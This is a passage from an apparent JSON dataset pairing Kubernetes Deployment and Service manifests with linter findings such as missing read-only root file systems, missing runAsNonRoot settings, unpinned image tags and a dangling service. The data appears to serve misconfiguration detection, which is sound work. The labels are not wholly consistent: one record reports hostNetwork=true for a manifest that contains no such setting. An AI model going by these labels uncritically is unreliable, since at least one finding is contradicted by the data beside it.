value: ${AGENT_IMAGE}\n        - name: RELATED_IMAGE_BROKER\n          value: ${BROKER_IMAGE}\n        - name: RELATED_IMAGE_BROKER_PLUGIN\n          value: ${BROKER_PLUGIN_IMAGE}\n        - name: RELATED_IMAGE_TOPIC_FORWARDER\n          value: ${TOPIC_FORWARDER_IMAGE}\n        - name: RELATED_IMAGE_NONE_AUTHSERVICE\n          value: ${NONE_AUTHSERVICE_IMAGE}\n        - name: RELATED_IMAGE_KEYCLOAK\n          value: ${KEYCLOAK_IMAGE}\n        - name: RELATED_IMAGE_KEYCLOAK_PLUGIN\n          value: ${KEYCLOAK_PLUGIN_IMAGE}\n        - name: CONTROLLER_ENABLE_CONSOLE_SERVICE\n          value: 'true'\n        - name: RELATED_IMAGE_CONSOLE_INIT\n          value: ${CONSOLE_INIT_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_SERVER\n          value: ${CONSOLE_SERVER_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_OPENSHIFT\n          value: ${CONSOLE_PROXY_OPENSHIFT_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_OPENSHIFT3\n          value: ${CONSOLE_PROXY_OPENSHIFT3_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_KUBERNETES\n          value: ${CONSOLE_PROXY_KUBERNETES_IMAGE}\n        - name: CONSOLE_LINK_SECTION_NAME\n          value: ${CONSOLE_LINK_SECTION_NAME}\n        - name: CONSOLE_LINK_NAME\n          value: ${CONSOLE_LINK_NAME}\n        - name: CONSOLE_LINK_IMAGE_URL\n          value: ${CONSOLE_LINK_IMAGE_URL}\n        - name: ENABLE_MONITORING\n          value: 'true'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"controller\" does not have a read-only root file system"
  },
  {
    "id": "10573",
    "manifest_path": "data/manifests/the_stack_sample/sample_4085.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: enmasse-operator\n  labels:\n    app: enmasse\n    name: enmasse-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: enmasse\n      name: enmasse-operator\n  template:\n    metadata:\n      labels:\n        app: enmasse\n        name: enmasse-operator\n      annotations:\n        enmasse.io/version: ${VERSION}\n        enmasse.io/revision: ${REVISION}\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 1\n            preference:\n              matchExpressions:\n              - key: node-role.enmasse.io/operator-infra\n                operator: In\n                values:\n                - 'true'\n      serviceAccountName: enmasse-operator\n      containers:\n      - name: controller\n        image: ${CONTROLLER_MANAGER_IMAGE}\n        imagePullPolicy: ${IMAGE_PULL_POLICY}\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: REVISION\n          value: ${REVISION}\n        - name: VERSION\n          value: ${VERSION}\n        - name: CONTROLLER_ENABLE_MESSAGING_INFRASTRUCTURE\n          value: 'false'\n        - name: OPERATOR_NAME\n          value: enmasse-operator\n        - name: IMAGE_PULL_POLICY\n          value: ${IMAGE_PULL_POLICY}\n        - name: CONTROLLER_DISABLE_ALL\n          value: 'true'\n        - name: CONTROLLER_ENABLE_UPGRADER\n          value: 'true'\n        - name: CONTROLLER_ENABLE_AUTHENTICATION_SERVICE\n          value: 'true'\n        - name: CONTROLLER_ENABLE_ADDRESS_SPACE_CONTROLLER\n          value: 'true'\n        - name: CONTROLLER_ENABLE_MESSAGING_USER\n          value: 'true'\n        - name: RELATED_IMAGE_ADDRESS_SPACE_CONTROLLER\n          value: ${ADDRESS_SPACE_CONTROLLER_IMAGE}\n        - name: RELATED_IMAGE_CONTROLLER_MANAGER\n          value: ${CONTROLLER_MANAGER_IMAGE}\n        - name: RELATED_IMAGE_ROUTER\n          value: ${ROUTER_IMAGE}\n        - name: RELATED_IMAGE_STANDARD_CONTROLLER\n          value: ${STANDARD_CONTROLLER_IMAGE}\n        - name: RELATED_IMAGE_AGENT\n          value: ${AGENT_IMAGE}\n        - name: RELATED_IMAGE_BROKER\n          value: ${BROKER_IMAGE}\n        - name: RELATED_IMAGE_BROKER_PLUGIN\n          value: ${BROKER_PLUGIN_IMAGE}\n        - name: RELATED_IMAGE_TOPIC_FORWARDER\n          value: ${TOPIC_FORWARDER_IMAGE}\n        - name: RELATED_IMAGE_NONE_AUTHSERVICE\n          value: ${NONE_AUTHSERVICE_IMAGE}\n        - name: RELATED_IMAGE_KEYCLOAK\n          value: ${KEYCLOAK_IMAGE}\n        - name: RELATED_IMAGE_KEYCLOAK_PLUGIN\n          value: ${KEYCLOAK_PLUGIN_IMAGE}\n        - name: CONTROLLER_ENABLE_CONSOLE_SERVICE\n          value: 'true'\n        - name: RELATED_IMAGE_CONSOLE_INIT\n          value: ${CONSOLE_INIT_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_SERVER\n          value: ${CONSOLE_SERVER_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_OPENSHIFT\n          value: ${CONSOLE_PROXY_OPENSHIFT_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_OPENSHIFT3\n          value: ${CONSOLE_PROXY_OPENSHIFT3_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_KUBERNETES\n          value: ${CONSOLE_PROXY_KUBERNETES_IMAGE}\n        - name: CONSOLE_LINK_SECTION_NAME\n          value: ${CONSOLE_LINK_SECTION_NAME}\n        - name: CONSOLE_LINK_NAME\n          value: ${CONSOLE_LINK_NAME}\n        - name: CONSOLE_LINK_IMAGE_URL\n          value: ${CONSOLE_LINK_IMAGE_URL}\n        - name: ENABLE_MONITORING\n          value: 'true'\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"enmasse-operator\" not found"
  },
  {
    "id": "10574",
    "manifest_path": "data/manifests/the_stack_sample/sample_4085.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: enmasse-operator\n  labels:\n    app: enmasse\n    name: enmasse-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: enmasse\n      name: enmasse-operator\n  template:\n    metadata:\n      labels:\n        app: enmasse\n        name: enmasse-operator\n      annotations:\n        enmasse.io/version: ${VERSION}\n        enmasse.io/revision: ${REVISION}\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 1\n            preference:\n              matchExpressions:\n              - key: node-role.enmasse.io/operator-infra\n                operator: In\n                values:\n                - 'true'\n      serviceAccountName: enmasse-operator\n      containers:\n      - name: controller\n        image: ${CONTROLLER_MANAGER_IMAGE}\n        imagePullPolicy: ${IMAGE_PULL_POLICY}\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: REVISION\n          value: ${REVISION}\n        - name: VERSION\n          value: ${VERSION}\n        - name: CONTROLLER_ENABLE_MESSAGING_INFRASTRUCTURE\n          value: 'false'\n        - name: OPERATOR_NAME\n          value: enmasse-operator\n        - name: IMAGE_PULL_POLICY\n          value: ${IMAGE_PULL_POLICY}\n        - name: CONTROLLER_DISABLE_ALL\n          value: 'true'\n        - name: CONTROLLER_ENABLE_UPGRADER\n          value: 'true'\n        - name: CONTROLLER_ENABLE_AUTHENTICATION_SERVICE\n          value: 'true'\n        - name: CONTROLLER_ENABLE_ADDRESS_SPACE_CONTROLLER\n          value: 'true'\n        - name: CONTROLLER_ENABLE_MESSAGING_USER\n          value: 'true'\n        - name: RELATED_IMAGE_ADDRESS_SPACE_CONTROLLER\n          value: ${ADDRESS_SPACE_CONTROLLER_IMAGE}\n        - name: RELATED_IMAGE_CONTROLLER_MANAGER\n          value: ${CONTROLLER_MANAGER_IMAGE}\n        - name: RELATED_IMAGE_ROUTER\n          value: ${ROUTER_IMAGE}\n        - name: RELATED_IMAGE_STANDARD_CONTROLLER\n          value: ${STANDARD_CONTROLLER_IMAGE}\n        - name: RELATED_IMAGE_AGENT\n          value: ${AGENT_IMAGE}\n        - name: RELATED_IMAGE_BROKER\n          value: ${BROKER_IMAGE}\n        - name: RELATED_IMAGE_BROKER_PLUGIN\n          value: ${BROKER_PLUGIN_IMAGE}\n        - name: RELATED_IMAGE_TOPIC_FORWARDER\n          value: ${TOPIC_FORWARDER_IMAGE}\n        - name: RELATED_IMAGE_NONE_AUTHSERVICE\n          value: ${NONE_AUTHSERVICE_IMAGE}\n        - name: RELATED_IMAGE_KEYCLOAK\n          value: ${KEYCLOAK_IMAGE}\n        - name: RELATED_IMAGE_KEYCLOAK_PLUGIN\n          value: ${KEYCLOAK_PLUGIN_IMAGE}\n        - name: CONTROLLER_ENABLE_CONSOLE_SERVICE\n          value: 'true'\n        - name: RELATED_IMAGE_CONSOLE_INIT\n          value: ${CONSOLE_INIT_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_SERVER\n          value: ${CONSOLE_SERVER_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_OPENSHIFT\n          value: ${CONSOLE_PROXY_OPENSHIFT_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_OPENSHIFT3\n          value: ${CONSOLE_PROXY_OPENSHIFT3_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_KUBERNETES\n          value: ${CONSOLE_PROXY_KUBERNETES_IMAGE}\n        - name: CONSOLE_LINK_SECTION_NAME\n          value: ${CONSOLE_LINK_SECTION_NAME}\n        - name: CONSOLE_LINK_NAME\n          value: ${CONSOLE_LINK_NAME}\n        - name: CONSOLE_LINK_IMAGE_URL\n          value: ${CONSOLE_LINK_IMAGE_URL}\n        - name: ENABLE_MONITORING\n          value: 'true'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"controller\" is not set to runAsNonRoot"
  },
  {
    "id": "10575",
    "manifest_path": "data/manifests/the_stack_sample/sample_4085.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: enmasse-operator\n  labels:\n    app: enmasse\n    name: enmasse-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: enmasse\n      name: enmasse-operator\n  template:\n    metadata:\n      labels:\n        app: enmasse\n        name: enmasse-operator\n      annotations:\n        enmasse.io/version: ${VERSION}\n        enmasse.io/revision: ${REVISION}\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 1\n            preference:\n              matchExpressions:\n              - key: node-role.enmasse.io/operator-infra\n                operator: In\n                values:\n                - 'true'\n      serviceAccountName: enmasse-operator\n      containers:\n      - name: controller\n        image: ${CONTROLLER_MANAGER_IMAGE}\n        imagePullPolicy: ${IMAGE_PULL_POLICY}\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: REVISION\n          value: ${REVISION}\n        - name: VERSION\n          value: ${VERSION}\n        - name: CONTROLLER_ENABLE_MESSAGING_INFRASTRUCTURE\n          value: 'false'\n        - name: OPERATOR_NAME\n          value: enmasse-operator\n        - name: IMAGE_PULL_POLICY\n          value: ${IMAGE_PULL_POLICY}\n        - name: CONTROLLER_DISABLE_ALL\n          value: 'true'\n        - name: CONTROLLER_ENABLE_UPGRADER\n          value: 'true'\n        - name: CONTROLLER_ENABLE_AUTHENTICATION_SERVICE\n          value: 'true'\n        - name: CONTROLLER_ENABLE_ADDRESS_SPACE_CONTROLLER\n          value: 'true'\n        - name: CONTROLLER_ENABLE_MESSAGING_USER\n          value: 'true'\n        - name: RELATED_IMAGE_ADDRESS_SPACE_CONTROLLER\n          value: ${ADDRESS_SPACE_CONTROLLER_IMAGE}\n        - name: RELATED_IMAGE_CONTROLLER_MANAGER\n          value: ${CONTROLLER_MANAGER_IMAGE}\n        - name: RELATED_IMAGE_ROUTER\n          value: ${ROUTER_IMAGE}\n        - name: RELATED_IMAGE_STANDARD_CONTROLLER\n          value: ${STANDARD_CONTROLLER_IMAGE}\n        - name: RELATED_IMAGE_AGENT\n          value: ${AGENT_IMAGE}\n        - name: RELATED_IMAGE_BROKER\n          value: ${BROKER_IMAGE}\n        - name: RELATED_IMAGE_BROKER_PLUGIN\n          value: ${BROKER_PLUGIN_IMAGE}\n        - name: RELATED_IMAGE_TOPIC_FORWARDER\n          value: ${TOPIC_FORWARDER_IMAGE}\n        - name: RELATED_IMAGE_NONE_AUTHSERVICE\n          value: ${NONE_AUTHSERVICE_IMAGE}\n        - name: RELATED_IMAGE_KEYCLOAK\n          value: ${KEYCLOAK_IMAGE}\n        - name: RELATED_IMAGE_KEYCLOAK_PLUGIN\n          value: ${KEYCLOAK_PLUGIN_IMAGE}\n        - name: CONTROLLER_ENABLE_CONSOLE_SERVICE\n          value: 'true'\n        - name: RELATED_IMAGE_CONSOLE_INIT\n          value: ${CONSOLE_INIT_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_SERVER\n          value: ${CONSOLE_SERVER_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_OPENSHIFT\n          value: ${CONSOLE_PROXY_OPENSHIFT_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_OPENSHIFT3\n          value: ${CONSOLE_PROXY_OPENSHIFT3_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_KUBERNETES\n          value: ${CONSOLE_PROXY_KUBERNETES_IMAGE}\n        - name: CONSOLE_LINK_SECTION_NAME\n          value: ${CONSOLE_LINK_SECTION_NAME}\n        - name: CONSOLE_LINK_NAME\n          value: ${CONSOLE_LINK_NAME}\n        - name: CONSOLE_LINK_IMAGE_URL\n          value: ${CONSOLE_LINK_IMAGE_URL}\n        - name: ENABLE_MONITORING\n          value: 'true'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"controller\" has cpu request 0"
  },
  {
    "id": "10576",
    "manifest_path": "data/manifests/the_stack_sample/sample_4085.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: enmasse-operator\n  labels:\n    app: enmasse\n    name: enmasse-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: enmasse\n      name: enmasse-operator\n  template:\n    metadata:\n      labels:\n        app: enmasse\n        name: enmasse-operator\n      annotations:\n        enmasse.io/version: ${VERSION}\n        enmasse.io/revision: ${REVISION}\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 1\n            preference:\n              matchExpressions:\n              - key: node-role.enmasse.io/operator-infra\n                operator: In\n                values:\n                - 'true'\n      serviceAccountName: enmasse-operator\n      containers:\n      - name: controller\n        image: ${CONTROLLER_MANAGER_IMAGE}\n        imagePullPolicy: ${IMAGE_PULL_POLICY}\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: REVISION\n          value: ${REVISION}\n        - name: VERSION\n          value: ${VERSION}\n        - name: CONTROLLER_ENABLE_MESSAGING_INFRASTRUCTURE\n          value: 'false'\n        - name: OPERATOR_NAME\n          value: enmasse-operator\n        - name: IMAGE_PULL_POLICY\n          value: ${IMAGE_PULL_POLICY}\n        - name: CONTROLLER_DISABLE_ALL\n          value: 'true'\n        - name: CONTROLLER_ENABLE_UPGRADER\n          value: 'true'\n        - name: CONTROLLER_ENABLE_AUTHENTICATION_SERVICE\n          value: 'true'\n        - name: CONTROLLER_ENABLE_ADDRESS_SPACE_CONTROLLER\n          value: 'true'\n        - name: CONTROLLER_ENABLE_MESSAGING_USER\n          value: 'true'\n        - name: RELATED_IMAGE_ADDRESS_SPACE_CONTROLLER\n          value: ${ADDRESS_SPACE_CONTROLLER_IMAGE}\n        - name: RELATED_IMAGE_CONTROLLER_MANAGER\n          value: ${CONTROLLER_MANAGER_IMAGE}\n        - name: RELATED_IMAGE_ROUTER\n          value: ${ROUTER_IMAGE}\n        - name: RELATED_IMAGE_STANDARD_CONTROLLER\n          value: ${STANDARD_CONTROLLER_IMAGE}\n        - name: RELATED_IMAGE_AGENT\n          value: ${AGENT_IMAGE}\n        - name: RELATED_IMAGE_BROKER\n          value: ${BROKER_IMAGE}\n        - name: RELATED_IMAGE_BROKER_PLUGIN\n          value: ${BROKER_PLUGIN_IMAGE}\n        - name: RELATED_IMAGE_TOPIC_FORWARDER\n          value: ${TOPIC_FORWARDER_IMAGE}\n        - name: RELATED_IMAGE_NONE_AUTHSERVICE\n          value: ${NONE_AUTHSERVICE_IMAGE}\n        - name: RELATED_IMAGE_KEYCLOAK\n          value: ${KEYCLOAK_IMAGE}\n        - name: RELATED_IMAGE_KEYCLOAK_PLUGIN\n          value: ${KEYCLOAK_PLUGIN_IMAGE}\n        - name: CONTROLLER_ENABLE_CONSOLE_SERVICE\n          value: 'true'\n        - name: RELATED_IMAGE_CONSOLE_INIT\n          value: ${CONSOLE_INIT_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_SERVER\n          value: ${CONSOLE_SERVER_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_OPENSHIFT\n          value: ${CONSOLE_PROXY_OPENSHIFT_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_OPENSHIFT3\n          value: ${CONSOLE_PROXY_OPENSHIFT3_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_KUBERNETES\n          value: ${CONSOLE_PROXY_KUBERNETES_IMAGE}\n        - name: CONSOLE_LINK_SECTION_NAME\n          value: ${CONSOLE_LINK_SECTION_NAME}\n        - name: CONSOLE_LINK_NAME\n          value: ${CONSOLE_LINK_NAME}\n        - name: CONSOLE_LINK_IMAGE_URL\n          value: ${CONSOLE_LINK_IMAGE_URL}\n        - name: ENABLE_MONITORING\n          value: 'true'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"controller\" has memory limit 0"
  },
  {
    "id": "10577",
    "manifest_path": "data/manifests/the_stack_sample/sample_4086.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bundestagio-depl\nspec:\n  selector:\n    matchLabels:\n      app: bundestagio\n  template:\n    spec:\n      containers:\n      - name: bundestagio\n        resources:\n          requests:\n            memory: 150M\n            cpu: 50m\n          limits:\n            memory: 500M\n            cpu: 1000m\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"bundestagio\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10578",
    "manifest_path": "data/manifests/the_stack_sample/sample_4086.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bundestagio-depl\nspec:\n  selector:\n    matchLabels:\n      app: bundestagio\n  template:\n    spec:\n      containers:\n      - name: bundestagio\n        resources:\n          requests:\n            memory: 150M\n            cpu: 50m\n          limits:\n            memory: 500M\n            cpu: 1000m\n",
    "policy_id": "mismatching-selector",
    "violation_text": "labels in pod spec (map[]) do not match labels in selector (&LabelSelector{MatchLabels:map[string]string{app: bundestagio,},MatchExpressions:[]LabelSelectorRequirement{},})"
  },
  {
    "id": "10579",
    "manifest_path": "data/manifests/the_stack_sample/sample_4086.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bundestagio-depl\nspec:\n  selector:\n    matchLabels:\n      app: bundestagio\n  template:\n    spec:\n      containers:\n      - name: bundestagio\n        resources:\n          requests:\n            memory: 150M\n            cpu: 50m\n          limits:\n            memory: 500M\n            cpu: 1000m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"bundestagio\" does not have a read-only root file system"
  },
  {
    "id": "10580",
    "manifest_path": "data/manifests/the_stack_sample/sample_4086.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bundestagio-depl\nspec:\n  selector:\n    matchLabels:\n      app: bundestagio\n  template:\n    spec:\n      containers:\n      - name: bundestagio\n        resources:\n          requests:\n            memory: 150M\n            cpu: 50m\n          limits:\n            memory: 500M\n            cpu: 1000m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"bundestagio\" is not set to runAsNonRoot"
  },
  {
    "id": "10581",
    "manifest_path": "data/manifests/the_stack_sample/sample_4088.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/component: rate-limiter\n    app.kubernetes.io/instance: observatorium-xyz\n    app.kubernetes.io/name: gubernator\n    app.kubernetes.io/part-of: observatorium\n    app.kubernetes.io/version: 1.0.0-rc.1\n  name: observatorium-xyz-gubernator\n  namespace: observatorium\nspec:\n  ports:\n  - name: grpc\n    port: 8081\n    targetPort: 8081\n  - name: http\n    port: 8080\n    targetPort: 8080\n  selector:\n    app.kubernetes.io/component: rate-limiter\n    app.kubernetes.io/instance: observatorium-xyz\n    app.kubernetes.io/name: gubernator\n    app.kubernetes.io/part-of: observatorium\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:rate-limiter app.kubernetes.io/instance:observatorium-xyz app.kubernetes.io/name:gubernator app.kubernetes.io/part-of:observatorium])"
  },
  {
    "id": "10582",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "10583",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-attacher\" is using an invalid container image, \"k8s.gcr.io/sig-storage/csi-attacher\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10584",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
